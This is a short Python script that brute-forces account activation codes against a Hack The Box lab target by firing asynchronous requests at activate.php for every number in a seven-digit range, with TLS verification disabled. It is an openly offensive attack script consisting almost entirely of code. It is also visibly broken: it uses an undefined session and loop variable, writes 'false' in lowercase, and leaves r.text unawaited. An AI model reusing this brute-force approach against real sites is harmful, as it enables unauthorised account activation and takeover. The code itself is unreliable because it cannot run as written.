import sys
import requests
import asyncio
import aiohttp
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

async def runCurl(url):
	async with session.get(url, verify=false) as r:
		text = r.text
		if (text.find("Invalid activation code.")==-1):
			print(f"code found: {i}")
			exit(0)


async def asyncRequest():
	async with aiohttp.ClientSession() as session:
		tasks=[]
		print("Running...")
		for i in range(100000,9999999):
			if (i % 10000 == 0):
				print(f"attempts thus far: {i}")
			url=f'https://broscience.htb/activate.php?code={i}'
			task = asyncio.ensure_future(runCurl(url))
			tasks.append(task)
		await asyncio.gather(*tasks, return_exceptions=True)

asyncio.get_event_loop().run_until_complete(asyncRequest())